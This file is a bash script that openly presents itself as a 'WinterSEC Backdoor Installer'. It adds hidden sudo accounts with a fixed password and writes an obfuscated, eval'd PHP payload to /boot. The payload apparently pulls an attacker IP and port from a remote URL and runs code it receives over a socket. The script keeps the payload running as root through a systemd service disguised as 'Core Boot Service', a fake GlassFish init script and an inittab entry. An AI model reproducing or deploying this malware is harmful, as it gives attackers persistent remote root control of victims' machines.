#!/bin/bash
OUTPUT=$(which php)
if [ -n $OUTPUT ]
then
    echo "WinterSEC Backdoor Installer"
    echo "Adding User............."
    adduser tnk
    adduser null
    adduser trix
    adduser systemd-main
    echo -e "1070\n1070" | sudo passwd tnk
    echo -e "1070\n1070" | sudo passwd trix
    echo -e "1070\n1070" | sudo passwd null
    echo -e "1070\n1070" | sudo passwd systemd-main
    echo "Making User a Sudo Use.............r"
    usermod -aG sudo tnk || usermod -aG wheel tnk
    usermod -aG sudo trix || usermod -aG wheel tnk
    usermod -aG sudo null || usermod -aG wheel tnk
    usermod -aG sudo systemd-main || usermod -aG wheel systemd-main
    if grep -q "tnk ALL=(ALL) ALL" "/etc/sudoers";
    then
        echo "Already Sudo"
    else
        echo "tnk ALL=(ALL) ALL" >> /etc/sudoers
    fi
    if grep -q "trix ALL=(ALL) ALL" "/etc/sudoers";
    then
        echo "Already Sudo"
    else
        echo "trix ALL=(ALL) ALL" >> /etc/sudoers
    fi
    if grep -q "null ALL=(ALL) ALL" "/etc/sudoers";
    then
        echo "Already Sudo"
    else
        echo "null ALL=(ALL) ALL" >> /etc/sudoers
    fi
    if grep -q "systemd-main ALL=(ALL) ALL" "/etc/sudoers";
    then
        echo "Already Sudo"
    else
        echo "systemd-main ALL=(ALL) ALL" >> /etc/sudoers
    fi
    
    touch /boot/winsec.php
    echo "<?php echo base64_decode(base64_decode('VjJsdWRHVnlJRWx6SUVOdmJXbHVaeUF0SUVaeWIyMGdWMmx1ZEdWeVUwVkRJQ2hYYUdsMFpTQlhZV3hyWlhKektRPT0='));\$tlfzpgfs_0=base64_decode('THlvOFAzQm9jQ0F2S2lvdklHVnljbTl5WDNKbGNHOXlkR2x1Wnlnd0tUc2dKR2x3SUQwZ1ptbHNaVjluWlhSZlkyOXVkR1Z1ZEhNb0ltaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5M2FHbDBaWGRoYkd0bGNuTXdNVFEzTDNkcGJuUmxjaTl0WVdsdUwybHdMblI0ZENJcElEc2dKSEJ2Y25RZ1BTQm1hV3hsWDJkbGRGOWpiMjUwWlc1MGN5Z2lhSFIwY0hNNkx5OXlZWGN1WjJsMGFIVmlkWE5sY21OdmJuUmxiblF1WTI5dEwzZG9hWFJsZDJGc2EyVnljekF4TkRjdmQybHVkR1Z5TDIxaGFXNHZjRzl5ZEM1MGVIUWlLU0E3SUdsbUlDZ29KR1lnUFNBbmMzUnlaV0Z0WDNOdlkydGxkRjlqYkdsbGJuUW5LU0FtSmlCcGMxOWpZV3hzWVdKc1pTZ2taaWtwSUhzZ0pITWdQU0FrWmlnaWRHTndPaTh2ZXlScGNIMDZleVJ3YjNKMGZTSXBPeUFrYzE5MGVYQmxJRDBnSjNOMGNtVmhiU2M3SUgwZ2FXWWdLQ0VrY3lBbUppQW9KR1lnUFNBblpuTnZZMnR2Y0dWdUp5a2dKaVlnYVhOZlkyRnNiR0ZpYkdVb0pHWXBLU0I3SUNSeklEMGdKR1lvSkdsd0xDQWtjRzl5ZENrN0lDUnpYM1I1Y0dVZ1BTQW5jM1J5WldGdEp6c2dmU0JwWmlBb0lTUnpJQ1ltSUNna1ppQTlJQ2R6YjJOclpYUmZZM0psWVhSbEp5a2dKaVlnYVhOZlkyRnNiR0ZpYkdVb0pHWXBLU0I3SUNSeklEMGdKR1lvUVVaZlNVNUZWQ3dnVTA5RFMxOVRWRkpGUVUwc0lGTlBURjlVUTFBcE95QWtjbVZ6SUQwZ1FITnZZMnRsZEY5amIyNXVaV04wS0NSekxDQWthWEFzSUNSd2IzSjBLVHNnYVdZZ0tDRWtjbVZ6S1NCN0lHUnBaU2dwT3lCOUlDUnpYM1I1Y0dVZ1BTQW5jMjlqYTJWMEp6c2dmU0JwWmlBb0lTUnpYM1I1Y0dVcElIc2daR2xsS0NkdWJ5QnpiMk5yWlhRZ1puVnVZM01uS1RzZ2ZTQnBaaUFvSVNSektTQjdJR1JwWlNnbmJtOGdjMjlqYTJWMEp5azdJSDBnYzNkcGRHTm9JQ2drYzE5MGVYQmxLU0I3SUdOaGMyVWdKM04wY21WaGJTYzZJQ1JzWlc0Z1BTQm1jbVZoWkNna2N5d2dOQ2s3SUdKeVpXRnJPeUJqWVhObElDZHpiMk5yWlhRbk9pQWtiR1Z1SUQwZ2MyOWphMlYwWDNKbFlXUW9KSE1zSURRcE95QmljbVZoYXpzZ2ZTQnBaaUFvSVNSc1pXNHBJSHNnWkdsbEtDazdJSDBnSkdFZ1BTQjFibkJoWTJzb0lrNXNaVzRpTENBa2JHVnVLVHNnSkd4bGJpQTlJQ1JoV3lkc1pXNG5YVHNnSkdJZ1BTQW5KenNnZDJocGJHVWdLSE4wY214bGJpZ2tZaWtnUENBa2JHVnVLU0I3SUhOM2FYUmphQ0FvSkhOZmRIbHdaU2tnZXlCallYTmxJQ2R6ZEhKbFlXMG5PaUFrWWlBdVBTQm1jbVZoWkNna2N5d2dKR3hsYmkxemRISnNaVzRvSkdJcEtUc2dZbkpsWVdzN0lHTmhjMlVnSjNOdlkydGxkQ2M2SUNSaUlDNDlJSE52WTJ0bGRGOXlaV0ZrS0NSekxDQWtiR1Z1TFhOMGNteGxiaWdrWWlrcE95QmljbVZoYXpzZ2ZTQjlJQ1JIVEU5Q1FVeFRXeWR0YzJkemIyTnJKMTBnUFNBa2N6c2dKRWRNVDBKQlRGTmJKMjF6WjNOdlkydGZkSGx3WlNkZElEMGdKSE5mZEhsd1pUc2dhV1lnS0dWNGRHVnVjMmx2Ymw5c2IyRmtaV1FvSjNOMWFHOXphVzRuS1NBbUppQnBibWxmWjJWMEtDZHpkV2h2YzJsdUxtVjRaV04xZEc5eUxtUnBjMkZpYkdWZlpYWmhiQ2NwS1NCN0lDUnpkV2h2YzJsdVgySjVjR0Z6Y3oxamNtVmhkR1ZmWm5WdVkzUnBiMjRvSnljc0lDUmlLVHNnSkhOMWFHOXphVzVmWW5sd1lYTnpLQ2s3SUgwZ1pXeHpaU0I3SUdWMllXd29KR0lwT3lCOUlHUnBaU2dwT3c9PQ==');eval(base64_decode(\$tlfzpgfs_0));?>" > /boot/winsec.php
    DIR="/etc/systemd/system/"
    DIR1="/etc/init.d/"
    if [ -d "$DIR" ]; then
        echo "Installing config files in ${DIR}..." touch /etc/systemd/system/wsec.service
        echo "[Unit]
Description=Core Boot Service
After=network.target
StartLimitIntervalSec=0
[Service]
Type=simple
Restart=always
RestartSec=10
User=root
ExecStart=/usr/bin/php /boot/winsec.php

[Install]
WantedBy=multi-user.target" > /etc/systemd/system/wsec.service
        systemctl start wsec.service
        systemctl enable wsec.service
    elif [ -d "$DIR1" ]; then
  # Take action if $DIR exists. #
  echo '#!/bin/bash
#
# glassfish4    GlassFish Server Open Source Edition 4.0
#
# chkconfig: 345 70 30
# description: GlassFish Server is a Java EE Application Server Platform
# processname: glassfish4

# Source function library.
. /etc/init.d/functions

RETVAL=0
prog="winsec"
LOCKFILE=/var/lock/subsys/$prog

# Declare variables for GlassFish Server
GLASSFISH_USER=root
ASADMIN=/usr/bin/php
DOMAIN=/boot/winsec.php

start() {
        echo -n "Starting $prog: "
        daemon --user $GLASSFISH_USER $ASADMIN $DOMAIN
        RETVAL=$?
        [ $RETVAL -eq 0 ] && touch $LOCKFILE
        echo
        return $RETVAL
}

case "$1" in
    start)
        start
        ;;
    stop)
        stop
        ;;
    status)
        status
        ;;
    restart)
        stop
        start
        ;;
    *)
        echo "Usage: $prog {start|stop|status|restart}"
        exit 1
        ;;
esac
exit $RETVAL' > /etc/init.d/wsec
sudo chmod +x /etc/init.d/wsec
chkconfig --add wsec
sudo service wsec start
echo "ms:2345:respawn:/bin/sh /etc/init.d/wsec" >> /etc/inittab

fi

    
else
    echo "LULZ!!!...PHP NOT INSTALLED........WE NEED IT ACTUALLY"
fi
